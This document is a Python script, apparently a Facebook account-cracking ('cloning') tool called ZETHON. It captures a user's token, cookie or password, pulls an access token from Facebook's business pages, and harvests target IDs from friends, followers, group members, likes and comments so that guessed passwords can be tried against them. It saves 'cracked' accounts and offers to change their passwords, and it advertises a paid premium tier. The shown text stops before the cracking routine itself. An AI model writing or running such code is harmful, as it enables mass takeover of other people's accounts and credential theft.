#-*-coding:utf-8-*-

try:
    import requests
except ImportError:
    print('\n [!] Modul requests belum terinstall!...\n')
    os.system('pip3 install requests')

try:
    import concurrent.futures
except ImportError:
    print('\n [!] Modul Futures belum terinstall!...\n')
    os.system('pip3 install futures')

try:
    import bs4
except ImportError:
    print('\n [!] Modul Bs4 belum terinstall!...\n')
    os.system('pip3 install bs4')

try:
    import rich
except ImportError:
    print('\n [×] Modul Rich belum terinstall!...\n')
    os.system('pip3 install rich')

import requests, os, re, bs4, sys, json, time, random, datetime, threading, itertools, urllib
from concurrent.futures import ThreadPoolExecutor as CHIGOZIEWORLDWIDE
from concurrent.futures import ThreadPoolExecutor as CHIGOZIEWORLDWIDE
from datetime import datetime
from bs4 import BeautifulSoup
# MODULE RICH IN PYTHON
from rich import print as prints
from rich.tree import Tree
from rich.panel import Panel
from rich.progress import track
#---- PROGRES ------
from rich.progress import Progress
from rich.progress import SpinnerColumn
from rich.progress import BarColumn
from rich.progress import TextColumn
from rich.progress import TimeElapsedColumn
# ------ LOADING -------
ct = datetime.now()
n = ct.month
bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
### WARNA RANDOM ###
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
#  CHIGOZIEWORLDWIDE.  #
#------------------------------->
### WARNA MODULE RICH ###
tebal  = '[b]'
merah  = '[#FF0022]'
pink   = '[#FF0099]'
hijau  = '[#00FF33]'
kuning = '[#FFFF00]'
hapus  = '[/]'
biru_m = '[bold cyan]'
warna_rich = random.choice(["[bold red]","[deep_pink3]","[blue]","[green]","[cyan]"])
############################ RESPONSE FACEBOOK ###########################################
data,data2={},{}
ubahP,pwBaru=[],[]
aman,cp,salah=0,0,0
Apk, ok, cp, id, loop = [], [], [], [], 0
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"}
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "August", "09": "September", "10": "October", "11": "November", "12": "December"}
###########################################################################################
url_lookup = "https://lookup-id.com/"
url_mb = "https://mbasic.facebook.com"
url_ip = "https://www.httpbin.org/ip"
url_graph = "https://graph.facebook.com/{}"
###########################################################################################
mene, kexx = "check.php", "?key="
wewe = "?fields=name,"
hsus = "friends.fields(id,name)"
flow = "subscribers.fields(id,name)"
asds = ".limit(5000)"
asdb = ".limit(5000)"
###########################################################################################
aedx, ssss, dddd, aaaa = "index.php?", "next=https%3A%2F%2Fdevelopers.facebook.com", "%2Ftools%2Fdebug", "%2Faccesstoken%2F"
###########################################################################################
bbbb, awss, cuii, mmkk = "login", "device-based", "validate-password", "?shbl=0"
# "https://kontol.com/"+cccc+"/"+uvgo+"/"+hhhh+"/"
cccc, uvgo, hhhh = "tools", "debug", "accesstoken"
bahasa = "ar,en-US;q=0.7,en;q=0.3"
#id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7
###########################################################################################
# lempankkkkkkkk
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)

#-------- HAPUS DATA LOGIN ------------
def hapus_log():
    try:os.remove(".token.txt");os.remove(".cokie.txt")
    except:pass
#-------- HAPUS HASIL DUMP     --------
def hapus_dump():
    try:os.remove("results/.x.json")
    except:pass
# ------- UNTUK MENGHAPUS TEKS --------
def hapus_teks():
    if "linux" in sys.platform.lower():
        try:os.system("clear")
        except:pass
    elif "win" in sys.platform.lower():
        try:os.system("cls")
        except:pass
    else:
        try:os.system("clear")
        except:pass

def mentod():
    prints(Panel(f"""[{H}1{H}]. GRAPH API (FAST)
[{H}2{H}]. GRAPH MBASIC (SLOW)
[{H}3{H}]. GRAPH (FASTER) [[green] Recommended [/]]""",title="[green]METODE LOGIN[/]"))

def ingfo():
    prints(Panel(f"""[{H}+{H}] OK RESULTS SAVED TO -> RESULTS/OK-{ha}-{op}-{ta}.txt
[{H}+{H}] CP RESULTS SAVED TO -> RESULTS/CP-{ha}-{op}-{ta}.txt

[{merah}×{H}] TURN ON/OFF AIRPLANE MODE 7 SECONDS If NO RESULTS."""))
#CRACK SELESAI
def CRACKED(ok,cp):
    if len(ok) != 0 or len(cp) != 0:
        print("")
        prints(Panel(f"[[bold green]+[/]] CRACKED OK : [bold green]{len(ok)}[/]  [[bold red]-[/]] CRACKED CP : [bold red]{len(cp)}[/]",title="[bold green]CLONING[/] [bold green]FINISHED[/]"))
        cek_cp = input(f"\n  [{H}?{H}] BRING UP THE CP DETECTION [Y/t]: ")
        if cek_cp =="":
            print(f"\n  [{H}!{H}] jangan kosong");hasil(ok,cp)
        elif cek_cp in["Y","y"]:
            jalan(f"  [{H}!{H}] hidupkan mode pesawat 8 detik terlebih dahulu.");time.sleep(5)
            ww=input(f"\n  [{H}?{H}] ubah password ketika tap yes [Y/t]: ")
            if ww in ("Y","y","ya"):
                ubahP.append("y")
                print(f"  [{H}•{N}] contoh password : {H}chigozie{H}")
                pwBar=input(f"\n  [{H}+{N}] masukan password baru : ")
                print("\n")
                if len(pwBar) <= 5:
                    print(f'  {H}[{H}×{H}] kata sandi minimal 6 karakter')
                else:
                    pwBaru.append(pwBar)
            for memek in cp:
                kontol = memek.replace('\n', '')
                titid  = kontol.split('|')
                jalan(f'  {H}[{H}>{H}] mencoba login ke akun : {K}{kontol.replace(" [×] ", "")}{N}')
                try:
                    log_hasil(titid[0].replace(" [×] ", ""), titid[1])
                except requests.exceptions.ConnectionError:
                    continue
                print("")
            print("")
            prints(Panel(f'    {H}Proses Pengecekan Selesai '));exit()
        elif cek_cp in["T","t"]:
            exit(f"   {H}*{H} Selamat tinggal:)")
        else:
            print(f"  [{H}!{H}] Y/t goblok");CRACKED(ok,cp)
    else:
        exit(f'  [{H}!{H}] opshh kamu tidak mendapatkan hasil :(')

def chigozie():
    try:os.mkdir('results')
    except:pass
    hapus_teks()
    WAR = random.choice(["[deep_pink3]","[bold red]","[green]","[cyan]","[blue]"])
    print("""%s
   ________  __________  ______  _   __   _________    __  ___________  __
  / ____/\ \/ /_  __/ / / / __ \/ | / /  / ____/   |  /  |/  /  _/ /\ \/ /
 / /      \  / / / / /_/ / / / /  |/ /  / /_  / /| | / /|_/ // // /  \  / 
/ /___    / / / / / __  / /_/ / /|  /  / __/ / ___ |/ /  / // // /___/ /  
\____/   /_/ /_/ /_/ /_/\____/_/ |_/  /_/   /_/  |_/_/  /_/___/_____/_/    
"""%(H))
    prints(Panel(f"""
[{WAR}01[/]]. LOGIN FACEBOOK TOKEN
[{WAR}02[/]]. LOGIN FACEBOOK COOKIES 
[{WAR}03[/]]. LOGIN FACEBOOK USER AND PASSWORD"""))
    p = input(f"  [{H}?{H}] ENTER : ")
    if p =="":
        print(f"\n  [{H}!{H}] Don't be empty");time.sleep(3);chigozie()
    elif p in["1","01"]:
        login_token()
    elif p in["2","02"]:
        login_cookie()
    elif p in["3","03"]:
        login_passwod()
    else:
        print(f"\n  [{H}!{H}] CORRECT INPUT .");time.sleep(3);chigozie()
#LOGIN TOKEN
def login_token():
    prints(Panel("      [[green]•[/]] ENTER YOUR FACEBOOK TOKEN [[green]•[/]]"))
    token = input(f"  [{H}?{H}] TOKEN FB :{H} ")
    animation = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
    print("")
    for i in range(50):
        time.sleep(0.1)
        sys.stdout.write(f"\r  {H}[{H}•{H}] {H}LOADING...{H} " + animation[i % len(animation)] +"\x1b[0m ")
        sys.stdout.flush()
    print("")
    try:
        nama = requests.get(f'https://graph.facebook.com/me?access_token={token}').json()['name']
        open('.token.txt', 'a').write(token)
        prints(Panel(f"""[[green]✓[/]]👹 ZETHON👹 [green]{nama}[/] TOKEN WORKING!
[[bold red]>[/]] USE THIS TOOL WISELY"""));time.sleep(0.3)
        exit(f"\n  [{H}!{H}] RETURN TO THE CMD BY TYPING python ZETHON.py")
    except (AttributeError,KeyError):
        exit(f"\n  {H}[{H}!{H}] token invalid!")
    except UnboundLocalError:
        exit(f"\n  {H}[{H}!{N}] token invalid!")
    except requests.exceptions.ConnectionError:
        exit(f"\n  {H}[{H}!{H}] no internet connection\n")
#LOGIN COOKIE
def login_cookie():
    prints(Panel("      [[green]•[/]] ENTER YOUR FACEBOOK COOKIES [[green]•[/]]"))
    cookie = input(f"  [{H}?{H}] COOKIES FB :{H} ")
    animation = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
    print("")
    for i in range(50):
        time.sleep(0.1)
        sys.stdout.write(f"\r  {H}[{H}•{H}] {H}LOADING...{H} " + animation[i % len(animation)] +"\x1b[0m ")
        sys.stdout.flush()
    print("")
    try:
        data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent":"Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer":"https://www.facebook.com/","host":"business.facebook.com","origin":"https://business.facebook.com","upgrade-insecure-requests":"1","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control":"max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie})
        find_token = re.search("(EAAG\w+)", data.text)
        open('.cokie.txt', 'a').write(cookie)
        open('.token.txt', 'a').write(find_token.group(1))
        nama = requests.get(f'https://graph.facebook.com/me?access_token={find_token.group(1)}').json()['name']
        prints(Panel(f"""[[green]✓[/]] 👹ZETHON👹 [green]{nama}[/] COOKIES WORKING!
[[bold red]>[/]] USE THIS TOOL WISELY !"""));time.sleep(0.3)
        exit(f"\n  [{H}!{H}] RETURN TO THE CMD BY TYPING python ZETHON.py")
    except (AttributeError,KeyError):
        exit(f"\n  {N}[{M}!{N}] cookie invalid!")
    except UnboundLocalError:
        exit(f"\n  {N}[{M}!{N}] cookie invalid!")
    except requests.exceptions.ConnectionError:
        exit(f"\n  {N}[{M}!{N}] no internet connection\n")
#MASUK PASSWORD
def login_passwod():
    prints(Panel("   [[green]•[/]] LOGIN FACEBOOK USERNAME AMD PASSWORD[[green]•[/]]"))
    session=requests.Session()
    user = input(f"  [{H}?{H}] LOGIN USERNAME : ")
    pasw = input(f"  [{H}?{H}] LOGIN PASSWORD: ")
    animation = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
    print("")
    for i in range(50):
        time.sleep(0.1)
        sys.stdout.write(f"\r  {H}[{H}•{H}] {H}LOADING...{H} " + animation[i % len(animation)] +"\x1b[0m ")
        sys.stdout.flush()
    print("")
    try:
        header = {
            "Host"                      : "m.facebook.com",
            "upgrade-insecure-requests" : "1",
            "user-agent"                : "NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+",
            "accept"                    : "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "dnt"                       : "1",
            "x-requested-with"          : "mark.via.gp",
            "sec-fetch-site"            : "same-origin",
            "sec-fetch-mode"            : "cors",
            "sec-fetch-user"            : "empty",
            "sec-fetch-dest"            : "document",
            "referer"                   : "https://m.facebook.com/",
            "accept-encoding"           : "gzip, deflate br",
            "accept-language"           : "ar,en-US;q=0.7,en;q=0.3",
        }
        r = session.get(f"https://m.facebook.com/{aedx}{ssss}{dddd}{aaaa}", headers=header)
        header1 = {
            "Host"                      : "m.facebook.com",
            "cache-control"             : "max-age=0",
            "upgrade-insecure-requests" : "1",
            "origin"                    : "https://m.facebook.com",
            "content-type"              : "application/x-www-form-urlencoded",
            "user-agent"                : "Mozilla/5.0 (Linux; Android 12; M2102J20SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
            "accept"                    : "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "x-requested-with"          : "XMLHttpRequest",
            "sec-fetch-site"            : "same-origin",
            "sec-fetch-mode"            : "cors",
            "sec-fetch-user"            : "empty",
            "sec-fetch-dest"            : "document",
            "referer"                   : "https://m.facebook.com//"+aedx+ssss+dddd+aaaa,
            "accept-encoding"           : "gzip, deflate br",
            "accept-language"           : "ar,en-US;q=0.7,en;q=0.3",
        }
        das = {
            "lsd":re.search('name="lsd" value="(.*?)"', str(r.text)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(r.text)).group(1),
            "uid":user,
            "flow":"login_no_pin",
            "pass":pasw,
            "next":"https://developers.facebook.com/"+cccc+"/"+uvgo+"/"+hhhh+"/",
        }
        po = session.post(f"https://m.facebook.com/{bbbb}/{awss}/{cuii}/{mmkk}", data = das, headers = header1, allow_redirects = False)
        if 'c_user' in session.cookies.get_dict():
            cooz = session.cookies.get_dict()
            coki = 'datr=' + cooz['datr'] + ';' + ('c_user=' + cooz['c_user']) + ';' + ('fr=' + cooz['fr']) + ';' + ('xs=' + cooz['xs'])
            data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent":"Mozilla/5.0 (Linux; Android 12; M2102J20SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","referer":"https://www.facebook.com/","host":"business.facebook.com","origin":"https://business.facebook.com","upgrade-insecure-requests":"1","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control":"max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":coki})
            neangan = re.search("(EAAG\w+)", data.text)
            token = neangan.group(1)
            open('.cokie.txt', 'a').write(coki)
            open('.token.txt', 'a').write(token)
            nama = requests.get('https://graph.facebook.com/me?access_token=%s'%(token)).json()['name']
            prints(Panel(f"""[[green]✓[/]] selamat [green]{nama}[/] username dan password kamu valid!
[[bold red]>[/]] gunakan dengan bijak yah tools nya!"""));time.sleep(2)
            print(f"\n  [{M}×{N}] tunggu sebentar sedang menampilkan cookie dan token.\n");time.sleep(4)
            print(f"  [{H}✓{H}] Cookie : {H}{coki}{H}");time.sleep(2)
            print(f"  [{H}✓{H}] Token  : {H}{token}{H}");time.sleep(2)
            exit(f"\n  [{H}!{H}] jalankan ulang perintah nya dengan ketik python ZETHON.py")
        elif 'checkpoint' in session.cookies.get_dict():
            exit(f"\n  [{H}!{H}] YOUR ACCOUNT IS ON CHECKPOINT.")
        else:
            exit(f"\n  [{H}×{H}] USERNAME AND PASSWORD ARE WRONG!")
    except (AttributeError,KeyError):
        exit(f"\n  [{H}×{H}] USERNAME AND PASSWORD ARE WRONG!")
    except UnboundLocalError:
        exit(f"\n  [{H}×{H}] USERNAME AND PASSWORD ARE WRONG!")
    except requests.exceptions.ConnectionError:
        exit(f"\n  {H}[{H}!{H}] tidak ada koneksi\n")

### CHIGOZIEWORLDWIDE ###
def chigozie_worldwide():
    hapus_teks();hapus_dump()
    WAR = random.choice(["[H]"])
    print("""%s
   ________  __________  ______  _   __   _________    __  ___________  __
  / ____/\ \/ /_  __/ / / / __ \/ | / /  / ____/   |  /  |/  /  _/ /\ \/ /
 / /      \  / / / / /_/ / / / /  |/ /  / /_  / /| | / /|_/ // // /  \  / 
/ /___    / / / / / __  / /_/ / /|  /  / __/ / ___ |/ /  / // // /___/ /  
\____/   /_/ /_/ /_/ /_/\____/_/ |_/  /_/   /_/  |_/_/  /_/___/_____/_/    
"""%(H))
    ipm = requests.get(url_ip).json()
    IP = ipm["origin"] 
    print(" ---------------------------------------------              ");time.sleep (0.03)                                                                                                                                           
    print(" AUTHOR        CHIGOZIEWORLDWIDE ");time.sleep (0.03)                     
    print(" VERSION        1k                                       ");time.sleep (0.03)   
    print(" TOOL MADE IN NIGERIAN                      ");time.sleep (0.03)
    print(" https://github.com/Chigozieworldwide ");time.sleep (0.03)
    print(" ---------------------------------------------                   ");time.sleep (0.03)
    print(".--------------------------------------------");time.sleep (0.03)
    print(" THIS TOOL IS MADE FOR EDUCATIONAL PROPOSE ");time.sleep (0.03)
    print(" WARNING DONT USE ILLEGAL ");time.sleep (0.03)
    print(" --------------------------------------------");time.sleep (0.03)
    print(" 👹 ZETHON 👹                      ");time.sleep (0.03)
    print(" ---------------------------------------------");time.sleep(0.03)
    print(" CHIGOZIEWORLDWIDE           ");time.sleep (0.03)
    print(" ---------------------------------------------");time.sleep(0.03)
    print(" PREMIUM                                 ");time.sleep (0.03)
    print(" 1MONTH 100$                        ");time.sleep (0.03) 
    print(" ---------------------------------------------");time.sleep(0.03)
    print(" ---------------------------------------------");time.sleep(0.03)
    print(" IP ADDRESS        %s\n"%(IP));time.sleep(0.01) 
    print(" ---------------------------------------------");time.sleep(0.03)
    print(" CHIGOZIEWORLDWIDE          ");time.sleep(0.03)
    print(" ---------------------------------------------");time.sleep(0.03)
    try:
        tokenz = open('.token.txt', 'r').read()
    except (IOError,AttributeError):
        print(f'  {N}[{M}×{N}] cookie invalid');time.sleep(2);hapus_log();chigozie()
    try:
        data = requests.get(f"https://graph.facebook.com/me?fields&access_token={tokenz}")
        xzxz = json.loads(data.text)
        nama = xzxz["name"]
    except (KeyError):
        print(f'  {N}[{M}×{N}] cookie invalid');time.sleep(2);hapus_log();chigozie()
    except requests.exceptions.ConnectionError:
        exit(f'  {N}[{M}!{N}] tidak ada koneksi')
    prints(Panel(f"    [{H}+{H}] WELCOME👉 {nama}{H} [{H}+{H}]"))
    prints(Panel(f"""
[{H}01{H}]. UNKNOWN    
[{H}02{H}]. CLONE FROM PUBLIC IDS 
[{H}03{H}]. CLONE FROM FOLLOWERS IDS
[{H}04{H}]. CLONE FROM LIKE POST IDS  
[{H}05{H}]. CLONE MULTIPLE IDS
[{H}06{H}]. CLONE FROM COMMENTS IDS
[{H}07{H}]. CHECKPOINT DETECT
[{H}08{H}]. CHECK CRACK RESULTS
[{H}09{H}]. UNKNOWN  [green]PAID[/]
[{H}00{H}]. LOGOUT {merah}EXIST PROGRAM{H}""",title=f'{H}•{H}•{H} MENU PILIHAN {H}•'))
    pepek = input(f'  [{H}*{H}] MENU : ')
    if pepek == '':
        print(f'  [{H}×{H}] jangan kosong kentod!');time.sleep(2);chigozie_worldwide()
    elif pepek in['1','01']:
            try:cookiz = open('.cokie.txt').read();kueh  = {"cookie":cookiz}
            except IOError:jalan(f"  [{H}×{H}] anda login menggunakan token, jika ingin crack dari like postingan silahkan login cookie terlebih dahulu");time.sleep(5);hapus_log();chigozie()
            kontol = input(f"\n  [{H}*{H}] masukkan id grup : ")
            url_group = "https://mbasic.facebook.com/browse/group/members/?id="+kontol
            crack_grup(url_group,kueh)
    elif pepek in['2','02']:
            try:
                id = "results/.x.json"
                prints(Panel(f"""[{H}+{H}]PREMIUM CLONING [bold green]5000[/]
[{H}*{H}] 👹ZETHON👹"""))
                try:user = input(f'  [{H}*{H}] INPUT USERNAME/ID : ');_memek_ = __convert__(user)
                except AttributeError:hapus_dump();exit(f"\n  {H}[{H}×{H}] username or id is not correct")
                data = requests.get(f"https://graph.facebook.com/{_memek_.get('_kontol_')}{wewe}{hsus}{asdb}&access_token={tokenz}")
                xxxx = json.loads(data.text)["friends"]
                for x in xxxx["data"]:
                    open(id,'a+').write(f"{x['id']}<=>{x['name']}\n")
            except KeyError:
                hapus_dump();exit(f'  {H}[{H}×{H}] YOUR ID IS NOT PUBLIC')
            return __crack__().plerr(id)
            try:
                id = "results/.x.json"
                prints(Panel(f"[{H}*{H}] username or id is not correct."))
                try:user = input(f'  [{H}*{H}] enter id or username : ');_memek_ = __convert__(user)
                except AttributeError:hapus_dump();exit(f"\n  {H}[{H}×{H}] username atau id tidak benar")
                data = requests.get(f"https://graph.facebook.com/{_memek_.get('_kontol_')}{wewe}{hsus}{asds}&access_token={tokenz}")
                xxxx = json.loads(data.text)["friends"]
                for x in xxxx["data"]:
                    open(id,'a+').write(f"{x['id']}<=>{x['name']}\n")
            except KeyError:
                hapus_dump();exit(f'  {H}[{H}×{H}] YOUR ID IS NOT PUBLIC')
            return __crack__().plerr(id)
    elif pepek in['3','03']:
            id = "results/.x.json"
            prints(Panel(f"[{H}*{H}] Ketik 'me' jika ingin crack dari daftar followers anda."))
            try:user = input(f"  [{H}*{H}] masukan id atau username followers : ");_memek_ = __convert__(user)
            except AttributeError:hapus_dump();exit(f"\n {H}[{H}×{H}] username atau id tidak benar")
            data = requests.get(f"https://graph.facebook.com/{_memek_.get('_kontol_')}{wewe}{flow}{asds}&access_token={tokenz}")
            xxxx = json.loads(data.text)["subscribers"]
            for x in xxxx["data"]:
                try:
                    open(id,'a+').write(f"{x['id']}<=>{x['name']}\n")
                except:
                    pass
                return __crack__().plerr(id)
    elif pepek in['4','04']:
            kontol = input(f"  [{H}*{H}] masukan id postingan : ")
            if kontol in[""," "]:
                print(f'  [{H}!{H}] jangan kosong kentod!');time.sleep(2);chigozie_worldwide()
            try:
                cookiz = open('.cokie.txt').read()
                kueh  = {"cookie":cookiz}
            except IOError:
                jalan(f"  [{H}×{H}] anda login menggunakan token, jika ingin crack dari like postingan silahkan login cookie terlebih dahulu");time.sleep(5);hapus_log();chigozie()
            try:
                print(f"  [{H}!{H}] untuk berhenti tekan CTRL lalu tekan c di keyboard anda.")
                like_post(f"https://mbasic.facebook.com/ufi/reaction/profile/browser/?ft_ent_identifier={kontol}", kueh)
            except KeyError:
                print(f"  [{H}!{H}] Why {kontol} mikir dong tolol, masukin id postingan yang bener ngentod");time.sleep(2);chigozie_worldwide()
    elif pepek in['5','05']:
            _ngocok_(tokenz)
    elif pepek in['6','06']:
            kontol = input(f"  [{H}*{H}] masukan id postingan : ")
            if kontol in[""," "]:
                print('  [{M}×{N}] jangan kosong kentod!');time.sleep(2);chigozie_worldwide()
            try:
                cookiz = open('.cokie.txt').read()
                kueh  = {"cookie":cookiz}
            except IOError:
                jalan(f"  [{M}×{N}] anda login menggunakan token, jika ingin crack dari komentar silahkan login cookie terlebih dahulu");time.sleep(5);os.remove('.token.txt');chigozie()
            try:
                print(f"  [{M}!{N}] untuk berhenti tekan CTRL lalu tekan c di keyboard anda.")
                ngomen_post(f"https://mbasic.facebook.com/{kontol}", kueh)
            except KeyError:
                print(f"  [{M}!{N}] Why {kontol} mikir dong tolol, masukin id postingan yang bener ngentod");time.sleep(2);chigozie_worldwide()
    elif pepek in['7','07']:
            gabut()
    elif pepek in['8','08']:
        dirs = os.listdir("results")
        prints(Panel("[ CHECK CRACK RESULTS ]"))
        for file in dirs:
            xxxx = open(f"results/{file}").read().splitlines()
            print(f"  [{H}+{H}] {file} -> {H}{len(xxxx)}{H}")
        file = input(f"\n  {H}[{H}?{H}] COPY FILE NAME :{H} ")
        if file == "":
            file = input(f"\n  {H}[{H}?{H} COPY FILE NAME :{H} ")
        total = open(f"results/{file}").read().splitlines()
        print(f"{H}  [{H}#{H}] --------------------------------------------");time.sleep(2)
        nm_file = ("%s"%(file)).replace("-", " ")
        hps_nm  = nm_file.replace(".txt", "").replace("OK", "").replace("CP", "").replace("cp_detektor", "").replace("invalid_ok", "")
        jalan("  [%s*%s] CHECK %sCRACK%s RESULTS %s:%s%s%s total %s: %s%s%s"%(H,H,H,H,H,H,hps_nm,H,H,H,len(total),H))
        print(f"{H}  [{H}#{H}] --------------------------------------------");time.sleep(2)
        for memek in total:
            kontol = memek.replace("\n","")
            titid  = kontol.replace(" [✓] ","  \x1b[0m[\x1b[1;92m✓\x1b[0m]\x1b[1;92m ").replace(" [×] ", "  \x1b[0m[\x1b[1;93m×\x1b[0m]\x1b[1;93m ")
            print(f"{titid}{H}");time.sleep(0.03)
        print(f"{H}  [{H}#{H}] --------------------------------------------");time.sleep(2)
        input('\n   [ %sBACK%s ] '%(H,H));chigozie_worldwide()
    elif pepek in['9','09']:
        jalan(f"\n  {H}  >>> Dapatkan user premium untuk menikmati semua fiture!!<<<{H}\n")
        upd = input("  [?] apakah ingin upgrade ke premium [Y/t]: ")
        if upd =="":
            exit(f"  {N}[{M}×{N}] Y/t memek!")
        elif upd in["Y","y"]:
            jalan("\n   %s* %sAnda akan di alihkan ke whatsapp..."%(H,H));time.sleep(0.02)
            os.system('xdg-open https://wa.me/+2348069472717?text=RATU+ERROR+BELI+LISENSINYA+DOOONG...........???');time.sleep(2);exit()
        elif upd in["T","t"]:
            jalan(f"{B} BYE:)");exit()
        
            exit(f"  {N}[{M}×{N}] Y/t memek!")
    elif pepek in['0','00']:
        titik = ['\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ','\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ']
        for x in titik:
            sys.stdout.write('\r  %s[%s+%s] DELETING COOKIES %s%s'%(H,H,H,x,H)); sys.stdout.flush()
            time.sleep(1)
        hapus_log()
        print("")
        prints(Panel(f"[{H}✓{H}] DELETED SUCCESSFULLY"));exit()
    
        print(f'  [{H}×{H}] menu [{H}{pepek}{H}] tidak ada, cek menu nya bro!');time.sleep(2);chigozie_worldwide()    
# CRACK GRUP
def crack_grup(url_group,kueh):
    try:
        id = "results/.x.json"
        sop_dev = BeautifulSoup(requests.get(url_group, cookies=kueh).content, "html.parser")
        members = sop_dev.find("div", id="objects_container")
        for dev in members.find_all("table"):
            user_ = dev["id"].replace("member_", "")
            nama_ = re.findall('<img alt="(.*), profile picture"', str(dev))[0]
            try:open(id,'a+').write(f"{str(user_)}<=>{str(nama_)}\n")
            except:pass
            sys.stdout.write(f"\r  [*] sedang mengumpulkan {len(id)} id...");sys.stdout.flush()
        if "Lihat Selengkapnya" in str(sop_dev):
            url = sop_dev.find("a", string="Lihat Selengkapnya")["href"]
            url_grup = "https://mbasic.facebook.com"+url
            crack_grup(url_group,kueh)
    except KeyError:
        hapus_dump();exit(f'  {H}[{H}×{H}] gagal mengambil id, kemungkinan grup tidaklah publik')
    return __crack__().plerr(id)

# CRACK LIKE POSTINGAN
def like_post(hencet, mmk):
    try:
        kontol=requests.get(hencet,cookies=mmk).text
        if "Semua 0" in kontol:
            print("  [!] Tidak ada yang menanggapi postingan, awokawokawok kasian akun nya sepi:v");time.sleep(2);chigozie_worldwide()
        else:
            memek=re.findall('\<h3\ class\=\".."\>\<a\ href\=\"(.*?)"\>(.*?)<\/a\>',kontol)
            for softek in memek:
                if "profile.php?" in softek[0]:
                    id.append(re.findall("id=(.*)",softek[0])[0]+"<=>"+softek[1])
                else:
                    id.append(re.findall("/(.*)",softek[0])[0]+"<=>"+softek[1])
                sys.stdout.write('\r  [*] sedang mengumpulkan %s id... '%(len(id))); sys.stdout.flush()
            if "Lihat Selengkapnya" in kontol:
                like_post(url_mb+BeautifulSoup(kontol,"html.parser").find("a",string="Lihat Selengkapnya").get("href"))
    except:pass
# CRACK KOMENTAR POSTINGAN
def ngomen_post(hencet, ikeh):
    try:
        kontol= requests.get(hencet,cookies=ikeh,headers=header_grup).text.encode("utf-8")
        memek = BeautifulSoup(kontol,'html.parser')
        for mmk in memek.find_all('h3'):
            for _id_ in mmk.find_all('a',href=True):
                if "profile.php" in _id_.get("href"):
                    xz = _id_.get("href").split('=')[1]
                    bb = xz.split('&')[0]
                    xd = _id_.text
                    id.append(bb+'<=>'+xd+'\n')
                else:
                    xz = _id_.get("href").split('?')[0]
